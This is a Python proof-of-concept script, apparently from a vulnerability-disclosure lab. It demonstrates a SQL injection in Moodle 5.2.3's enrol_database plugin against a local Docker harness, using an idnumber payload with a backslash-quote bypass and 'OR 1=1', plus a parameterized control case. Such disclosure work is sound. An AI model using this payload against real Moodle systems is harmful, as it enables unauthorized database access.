#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: moodle-enrol-database-sqli (High: 8.1)
#  Vendor: Moodle LMS (Moodle)
#  Versions: Moodle 5.2.3 (v5.2.3 344232c)
#  Impact: enrol_database concatenates course idnumber into external enrolment SQL
#  Requires: loopback Docker; enrol_database gadget plus mysql:8.0 on 127.0.0.1:19570
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "moodle-enrol-database-sqli"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove Moodle v5.2.3 enrol_database concatenates course idnumber into external-DB SQL."""


import json
from dataclasses import dataclass
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen

LABEL = "moodle-enrol-database-sqli"
WITNESS = "MOODLE-ENROL-DATABASE-SQLI-WITNESS"
PIN = "5.2.3"
PIN_SHA_PREFIX = "344232c153"
HOST = "127.0.0.1"
PORT = 19570
HTTP_TIMEOUT_S = 20.0
CLEAN_IDNUMBER = "LABCOURSE"
# dbsybasequoting defaults off: only ' is doubled, so \\' closes the MySQL string.
INJECT_IDNUMBER = "LABCOURSE\\' OR 1=1 -- "


@dataclass(frozen=True)
class HttpExchange:
    status: int
    body: str
    error: str = ""


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 280) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def http_get(query: dict[str, str]) -> HttpExchange:
    url = f"http://{HOST}:{PORT}/?{urlencode(query)}"
    req = Request(url, method="GET")
    try:
        with urlopen(req, timeout=HTTP_TIMEOUT_S) as resp:
            return HttpExchange(status=int(resp.status), body=resp.read().decode("utf-8", "replace"))
    except HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return HttpExchange(status=int(exc.code), body=body, error=type(exc).__name__)
    except (URLError, TimeoutError, OSError) as exc:
        return HttpExchange(status=0, body="", error=clip(str(exc)))


def parse_json(exchange: HttpExchange) -> dict[str, Any] | None:
    try:
        loaded = json.loads(exchange.body)
    except json.JSONDecodeError:
        return None
    return loaded if isinstance(loaded, dict) else None


def userids_of(data: dict[str, Any]) -> list[str]:
    raw = data.get("userids")
    if not isinstance(raw, list):
        return []
    return [str(item) for item in raw]


def sql_of(data: dict[str, Any]) -> str:
    sql = data.get("sql")
    return sql if isinstance(sql, str) else ""


def main() -> int:
    log(f"label={LABEL} url=http://{HOST}:{PORT}/ witness={WITNESS}")
    log(f"pin=moodle {PIN} sha={PIN_SHA_PREFIX} leftover=enrol_database how=gadget sink=enrol-db")

    ping = http_get({"mode": "ping"})
    ping_data = parse_json(ping)
    if ping.status != 200 or not ping_data:
        return fail(f"ping-failed status={ping.status} error={ping.error} body={clip(ping.body)}")
    pin = str(ping_data.get("pin") or "")
    sha = str(ping_data.get("sha") or "")
    db_ok = str(ping_data.get("db") or "")
    log(f"IOC ping status={ping.status} pin={pin} sha={sha} db={db_ok} sink={ping_data.get('sink')}")
    if pin != PIN or not sha.startswith(PIN_SHA_PREFIX) or db_ok != "ok":
        return fail(f"pin-mismatch pin={pin!r} sha={sha!r} db={db_ok!r}")

    off = http_get({"mode": "sync", "plugin": "off", "idnumber": INJECT_IDNUMBER})
    off_data = parse_json(off)
    if off.status != 200 or not off_data:
        return fail(f"plugin-off-failed status={off.status} body={clip(off.body)}")
    off_sql = sql_of(off_data)
    off_rows = int(off_data.get("row_count") or 0)
    off_exec = bool(off_data.get("executed"))
    log(
        f"IOC plugin-off executed={str(off_exec).lower()} rows={off_rows} "
        f"skipped={off_data.get('skipped')} sql={clip(off_sql)!r}"
    )
    if off_exec or off_sql or off_rows != 0:
        return fail("plugin-off-queried")

    clean = http_get(
        {
            "mode": "sync",
            "plugin": "on",
            "style": "concat",
            "idnumber": CLEAN_IDNUMBER,
        }
    )
    clean_data = parse_json(clean)
    if clean.status != 200 or not clean_data:
        return fail(f"clean-failed status={clean.status} body={clip(clean.body)}")
    clean_sql = sql_of(clean_data)
    clean_ids = userids_of(clean_data)
    clean_rows = int(clean_data.get("row_count") or 0)
    log(f"IOC clean rows={clean_rows} userids={clean_ids} sql={clip(clean_sql)!r}")
    if not bool(clean_data.get("executed")):
        return fail("clean-not-executed")
    if clean_rows != 1 or clean_ids != ["teacher-local"]:
        return fail(f"clean-unexpected-rows rows={clean_rows} userids={clean_ids}")
    if WITNESS in clean_ids or bool(clean_data.get("has_witness")):
        return fail("clean-leaked-witness")
    if "courseid = 'LABCOURSE'" not in clean_sql.replace("\n", " "):
        return fail("clean-sql-not-concat")
    if bool(clean_data.get("placeholder")):
        return fail("clean-parameterized")

    inject = http_get(
        {
            "mode": "sync",
            "plugin": "on",
            "style": "concat",
            "idnumber": INJECT_IDNUMBER,
        }
    )
    inject_data = parse_json(inject)
    if inject.status != 200 or not inject_data:
        return fail(f"inject-failed status={inject.status} body={clip(inject.body)}")
    inject_sql = sql_of(inject_data)
    inject_ids = userids_of(inject_data)
    inject_rows = int(inject_data.get("row_count") or 0)
    log(
        f"IOC inject rows={inject_rows} userids={inject_ids} has_witness="
        f"{inject_data.get('has_witness')} placeholder={inject_data.get('placeholder')} "
        f"sql={clip(inject_sql)!r}"
    )
    if not bool(inject_data.get("executed")):
        return fail("inject-not-executed")
    if bool(inject_data.get("placeholder")) or "?" in inject_sql:
        return fail("inject-parameterized-like-auth-db")
    if "OR 1=1" not in inject_sql:
        return fail("inject-sql-missing-fragment")
    if inject_rows <= clean_rows:
        return fail(f"inject-no-extra-rows inject={inject_rows} clean={clean_rows}")
    if WITNESS not in inject_ids or not bool(inject_data.get("has_witness")):
        return fail("inject-missing-witness-row")

    param = http_get(
        {
            "mode": "sync",
            "plugin": "on",
            "style": "param",
            "idnumber": INJECT_IDNUMBER,
        }
    )
    param_data = parse_json(param)
    if param.status != 200 or not param_data:
        return fail(f"param-failed status={param.status} body={clip(param.body)}")
    param_sql = sql_of(param_data)
    param_ids = userids_of(param_data)
    param_rows = int(param_data.get("row_count") or 0)
    log(
        f"IOC param rows={param_rows} userids={param_ids} placeholder="
        f"{param_data.get('placeholder')} sql={clip(param_sql)!r}"
    )
    if not bool(param_data.get("placeholder")) or "?" not in param_sql:
        return fail("param-not-bound")
    if param_rows != 0 or WITNESS in param_ids:
        return fail(f"param-extra-rows rows={param_rows} userids={param_ids}")

    log(
        "SUCCESS "
        f"{LABEL} how=gadget plugin-off=no-query clean-rows={clean_rows} "
        f"inject-rows={inject_rows} sql-concat=yes param-rows={param_rows} "
        f"extra=yes sink=enrol-db {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

